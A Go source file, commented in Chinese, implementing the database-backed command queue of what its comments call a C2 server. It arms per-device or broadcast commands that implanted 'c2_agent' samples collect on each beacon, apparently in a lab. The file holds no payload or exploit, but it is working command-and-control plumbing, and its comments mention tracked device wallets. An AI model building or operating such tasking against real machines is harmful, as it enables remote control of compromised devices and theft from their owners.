package store

import (
	"database/sql"
	"encoding/json"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

// CommandQueue 指令下发队列（DB 共享版）—— 多实例/多 worker 横向扩展。
//
// 语义对齐样本端 pe_worker c2_agent 命令循环：每次 /beacon 抵达时若队列武装
// （非空），响应即替换为该指令；once=True（默认）表示单发即清，循环回到 noop。
//
// 与 Python 版差异：状态不再放进程内 + command.json，而是落在共享库
// `command_queue` 单行表（id=1）。任意实例武装，任意实例的 beacon 都能原子领走，
// 因此 N 个 worker 共享同一条指令链。
type CommandQueue struct {
	mu sync.Mutex
}

// NewCommandQueue 构造（DB 由 InitDB 提供）。
func NewCommandQueue() *CommandQueue { return &CommandQueue{} }

// Set 武装一条下发指令；下一次任意实例的 /beacon 即回。
func (q *CommandQueue) Set(cmdType string, params map[string]any, once bool, commandID string) map[string]any {
	if params == nil {
		params = map[string]any{}
	}
	if commandID == "" {
		commandID = "lab-" + itoa64(time.Now().UnixNano()/int64(time.Millisecond))
	}
	pj, _ := json.Marshal(params)
	ts, _ := Now()
	GetDB().Exec(
		"INSERT INTO command_queue(id, command_id, cmd_type, params_json, once, state, armed_ts, dispatched_ts, client_ip)"+
			" VALUES(1,?,?,?,?,'armed',?,NULL,NULL)"+
			" ON DUPLICATE KEY UPDATE command_id=VALUES(command_id), cmd_type=VALUES(cmd_type),"+
			" params_json=VALUES(params_json), once=VALUES(once), state='armed', armed_ts=VALUES(armed_ts),"+
			" dispatched_ts=NULL, client_ip=NULL",
		commandID, cmdType, string(pj), boolToInt(once), ts)
	return map[string]any{"command_id": commandID, "type": cmdType, "params": params}
}

// Clear 清空队列（回 noop）。
func (q *CommandQueue) Clear() {
	GetDB().Exec("DELETE FROM command_queue WHERE id=1")
}

// Take beacon 抵达：原子领取（once 单发即清；repeat 保留）。跨实例安全。
func (q *CommandQueue) Take() map[string]any {
	var out map[string]any
	_ = GetDB().Tx(func(tx *sql.Tx) error {
		var (
			cid, ctype string
			pj         sql.NullString
			once       int
		)
		row := tx.QueryRow(
			"SELECT command_id, cmd_type, params_json, once FROM command_queue WHERE id=1 AND state='armed' FOR UPDATE")
		if err := row.Scan(&cid, &ctype, &pj, &once); err != nil {
			return nil // sql.ErrNoRows → 无武装指令
		}
		ts, _ := Now()
		if once != 0 {
			_, _ = tx.Exec("UPDATE command_queue SET state='dispatched', dispatched_ts=? WHERE id=1", ts)
		} else {
			_, _ = tx.Exec("UPDATE command_queue SET dispatched_ts=? WHERE id=1", ts)
		}
		params := map[string]any{}
		if pj.Valid && pj.String != "" {
			_ = json.Unmarshal([]byte(pj.String), &params)
		}
		out = map[string]any{"command_id": cid, "type": ctype, "params": params}
		return nil
	})
	return out
}

// Current 当前武装指令（不下发）。
func (q *CommandQueue) Current() map[string]any {
	row := GetDB().QueryOne(
		"SELECT command_id, cmd_type, params_json FROM command_queue WHERE id=1 AND state='armed'")
	if row == nil {
		return nil
	}
	params := map[string]any{}
	if s := toStr(row["params_json"]); s != "" {
		_ = json.Unmarshal([]byte(s), &params)
	}
	return map[string]any{"command_id": toStr(row["command_id"]), "type": toStr(row["cmd_type"]), "params": params}
}

// Once 当前指令是否单发即清（无指令时为 true）。
func (q *CommandQueue) Once() bool {
	row := GetDB().QueryOne("SELECT once FROM command_queue WHERE id=1 AND state='armed'")
	if row == nil {
		return true
	}
	return toInt(row["once"]) != 0
}

// ============================================================================
// 按设备独立队列（批量异步下发）—— 一台设备不来心跳不会阻塞其它设备
//
// 语义：
//   target = uuid / ip        → 只由该身份的 beacon 领走
//   target = '*'              → 广播：任一设备领一次（once 时领完即清）
//   TakeFor 按 [uuid, ip, '*'] 顺序匹配，命中即返回；回落由调用方决定是否用全局队列。
// ============================================================================

// cmdSeq 进程内自增序号（配合 PID，保证多 worker 下 command_id 也唯一）。
var cmdSeq uint64

// nextCommandID 生成 command_id：毫秒-PID-序号。
// Windows 的纳秒时钟分辨率不足，批量下发同毫秒内 N 条会撞号，故叠 PID + 原子序号。
func nextCommandID() string {
	return "lab-" + itoa64(time.Now().UnixMilli()) + "-" +
		itoa64(int64(os.Getpid())) + "-" +
		itoa64(int64(atomic.AddUint64(&cmdSeq, 1)))
}

// SetFor 给指定目标武装一条指令（进入该设备的独立 FIFO）。
func (q *CommandQueue) SetFor(target, cmdType string, params map[string]any, once bool, commandID, batchID string) map[string]any {
	if params == nil {
		params = map[string]any{}
	}
	if target == "" {
		target = "*"
	}
	if commandID == "" {
		commandID = nextCommandID()
	}
	pj, _ := json.Marshal(params)
	ts, _ := Now()
	GetDB().Exec(
		"INSERT INTO device_commands(target, command_id, cmd_type, params_json, once, state, armed_ts, batch_id)"+
			" VALUES(?,?,?,?,?,'armed',?,?)",
		target, commandID, cmdType, string(pj), boolToInt(once), ts, batchID)
	return map[string]any{"command_id": commandID, "type": cmdType, "params": params,
		"target": target, "batch_id": batchID, "state": "armed"}
}

// TakeFor beacon 抵达：按身份依次匹配（uuid → ip → 广播），原子领走该目标最老一条 armed。
func (q *CommandQueue) TakeFor(ids []string) map[string]any {
	cands := q.expandCands(ids)
	if len(cands) == 0 {
		return nil
	}

	var out map[string]any
	_ = GetDB().Tx(func(tx *sql.Tx) error {
		for _, t := range cands {
			var (
				id    int64
				cid   string
				ctype string
				pj    sql.NullString
				once  int
			)
			row := tx.QueryRow(
				"SELECT id, command_id, cmd_type, params_json, once FROM device_commands"+
					" WHERE target=? AND state='armed' ORDER BY id LIMIT 1 FOR UPDATE", t)
			if err := row.Scan(&id, &cid, &ctype, &pj, &once); err != nil {
				continue // 该身份无武装指令 → 试下一个身份
			}
			ts, _ := Now()
			if once != 0 {
				if _, err := tx.Exec(
					"UPDATE device_commands SET state='dispatched', dispatched_ts=?, client_ip=? WHERE id=?",
					ts, t, id); err != nil {
					return err
				}
			} else if _, err := tx.Exec(
				"UPDATE device_commands SET dispatched_ts=?, client_ip=? WHERE id=?",
				ts, t, id); err != nil {
				return err
			}
			params := map[string]any{}
			if pj.Valid && pj.String != "" {
				_ = json.Unmarshal([]byte(pj.String), &params)
			}
			out = map[string]any{"command_id": cid, "type": ctype, "params": params, "target": t}
			return nil
		}
		return nil
	})
	return out
}

// expandCands beacon 领取身份展开：原始身份（uuid / 连接IP）之外，双向补
// 「托管设备的列表 IP」与「列表 IP 配对的 uuid」别名。
//
// 为什么需要：DevicesView（已编译前端）下发 targets 用的是设备列表里的 ip；
// 而真机 beacon 可能经隧道接入，连接 IP 是 WAN 口径（X-Forwarded-For），
// 与 LAN 列表 IP 不一致 —— 仅按 ip 匹配会让 IP 武装的指令永远不被领取。
// 展开：uuid(U)→listed_ip(U)、listed_ip(C)→uuid(C)，去重后保持 uuid → ip → 别名 → '*' 顺序。
//
// 性能（INC-2026-0929-001 根因修复）：
//
//	旧版在此调用 ListDevices()（8+ 次全量聚合，含 access_log 全表 GROUP BY），
//	每次 /beacon 都触发且无并发上限 → 76 goroutine 堆积 → GC 死亡螺旋。
//	新版：(1) 改用轻量 uuid↔ip 映射（单查询 + 2s TTL 缓存）→ §6.1/§6.3；
//	      (2) 信号量硬上限 + 快速失败，宁可不展开别名也不堆积 → §6.2。
func (q *CommandQueue) expandCands(ids []string) []string {
	// §6.2 并发上限 + 快速失败：拿不到槽位就在 expandWait 内退化为原始身份 + 广播。
	select {
	case expandSem <- struct{}{}:
		defer func() { <-expandSem }()
	case <-time.After(expandWait):
		expandFastFail.Add(1) // 背压观测：快速失败次数（/__metrics）
		cands := make([]string, 0, len(ids)+1)
		seen := map[string]bool{}
		for _, s := range ids {
			if s != "" && !seen[s] {
				seen[s] = true
				cands = append(cands, s)
			}
		}
		cands = append(cands, "*")
		return cands
	}

	cands := make([]string, 0, 8)
	seen := map[string]bool{}
	for _, s := range ids {
		if s != "" && !seen[s] {
			seen[s] = true
			cands = append(cands, s)
		}
	}
	changed := true
	for pass := 0; pass < 2 && changed; pass++ { // 别名链最多展开两层
		changed = false
		for _, d := range deviceIdentityPairs() {
			uuid, ip := d.uuid, d.ip
			if uuid == "" || ip == "" {
				continue
			}
			if seen[uuid] && !seen[ip] {
				seen[ip] = true
				cands = append(cands, ip)
				changed = true
			} else if seen[ip] && !seen[uuid] {
				seen[uuid] = true
				cands = append(cands, uuid)
				changed = true
			}
		}
	}
	cands = append(cands, "*")
	return cands
}

// ── expandCands 的轻量数据源 + 并发上限 ──
//
// 这是 /beacon 热路径的专项优化：expandCands 只关心 uuid↔ip 两列，无需 ListDevices
// 的 war/notes/apps/wallets/profile/progress 全套聚合。用单次轻量查询 + 秒级缓存替代，
// 把每次 beacon 的 DB 压力从「8+ 次全量扫描」降到「0（缓存命中）或 1 次（回源）」。

const (
	// expandMax 并发硬上限：宁可在高峰快速失败，也不允许无界堆积。
	expandMax = 16
	// expandWait 等待槽位的上限；超时即退化为原始身份 + 广播（不阻塞）。
	expandWait = 2 * time.Second
	// idMapTTL uuid↔ip 映射缓存有效期。
	idMapTTL = 2 * time.Second
)

// expandSem expandCands 并发信号量（缓冲 channel 语义）。
var expandSem = make(chan struct{}, expandMax)

// 运行指标（/__metrics 暴露；INC-2026-0929-001 §6.7）。
var (
	expandFastFail atomic.Int64 // 拿不到槽位而快速失败（退化候选集）的次数
	idMapReload    atomic.Int64 // uuid↔ip 映射缓存回源次数
)

// idPair 设备身份映射（uuid ↔ 权威 ip）。
type idPair struct{ uuid, ip string }

// idMapCacheT uuid↔ip 映射的秒级缓存：TTL 命中走读锁；回源持写锁互斥
// （等价 singleflight 合并并发回源，避免缓存失效瞬间 N 个请求同时打库）。
type idMapCacheT struct {
	mu     sync.RWMutex
	pairs  []idPair
	expire time.Time
}

var idMapCache = &idMapCacheT{}

// deviceIdentityPairs 返回全部设备的 (uuid, ip) 对，仅用于 expandCands 别名展开。
func deviceIdentityPairs() []idPair {
	c := idMapCache
	c.mu.RLock()
	if time.Now().Before(c.expire) {
		p := c.pairs
		c.mu.RUnlock()
		return p
	}
	c.mu.RUnlock()

	c.mu.Lock()
	defer c.mu.Unlock()
	if time.Now().Before(c.expire) { // double-check：等锁期间可能已被他人回源
		return c.pairs
	}
	c.pairs = loadDeviceIdentityPairs()
	c.expire = time.Now().Add(idMapTTL)
	idMapReload.Add(1)
	return c.pairs
}

// loadDeviceIdentityPairs 单次轻量查询：从 device_profiles（权威档案）取 uuid↔ip。
func loadDeviceIdentityPairs() []idPair {
	db := GetDB()
	if db == nil {
		return nil
	}
	rows := db.Query("SELECT uuid, ip FROM device_profiles WHERE uuid<>'' AND ip<>''")
	pairs := make([]idPair, 0, len(rows))
	for _, r := range rows {
		u, ip := toStr(r["uuid"]), toStr(r["ip"])
		if u != "" && ip != "" {
			pairs = append(pairs, idPair{uuid: u, ip: ip})
		}
	}
	return pairs
}

// ListTargets 按设备聚合队列状态（控制台总览：每台 pending/dispatched 各多少）。
func (q *CommandQueue) ListTargets() []map[string]any {
	return GetDB().Query(`
        SELECT target,
               SUM(CASE WHEN state='armed'      THEN 1 ELSE 0 END) AS armed,
               SUM(CASE WHEN state='dispatched' THEN 1 ELSE 0 END) AS dispatched,
               COUNT(*) AS total,
               MAX(armed_ts) AS last_armed_ts
        FROM device_commands
        GROUP BY target
        ORDER BY MAX(id) DESC`)
}

// ListByTarget 单台设备的队列明细（新的在前）。
func (q *CommandQueue) ListByTarget(target string, limit int) []map[string]any {
	if limit <= 0 || limit > 500 {
		limit = 100
	}
	rows := GetDB().Query(
		"SELECT id, target, command_id, cmd_type, params_json, once, state, armed_ts, dispatched_ts,"+
			" client_ip, batch_id FROM device_commands WHERE target=? ORDER BY id DESC LIMIT ?", target, limit)
	for _, r := range rows {
		if s := toStr(r["params_json"]); s != "" {
			var p map[string]any
			if json.Unmarshal([]byte(s), &p) == nil {
				r["params"] = p
			}
		}
		delete(r, "params_json")
		r["once"] = toInt(r["once"]) != 0
	}
	return rows
}

// ClearFor 取消某台设备待发指令（armed → cancelled），已下发记录保留作审计。
func (q *CommandQueue) ClearFor(target string) int {
	if target == "" {
		return 0
	}
	n := toInt(GetDB().QueryOne(
		"SELECT COUNT(*) AS n FROM device_commands WHERE target=? AND state='armed'", target)["n"])
	GetDB().Exec("UPDATE device_commands SET state='cancelled' WHERE target=? AND state='armed'", target)
	return int(n)
}

// CancelByID 取消单条待发指令。
func (q *CommandQueue) CancelByID(id int64) {
	GetDB().Exec("UPDATE device_commands SET state='cancelled' WHERE id=? AND state='armed'", id)
}

var (
	queueMu sync.RWMutex // 读多写少：GetQueue 为 /beacon 热路径，读用 RLock
	globalQ *CommandQueue
)

// InitQueue 初始化全局队列（DB 共享，无本地持久文件）。
func InitQueue() {
	queueMu.Lock()
	defer queueMu.Unlock()
	globalQ = NewCommandQueue()
}

// GetQueue 返回全局队列。
func GetQueue() *CommandQueue {
	queueMu.RLock()
	defer queueMu.RUnlock()
	return globalQ
}
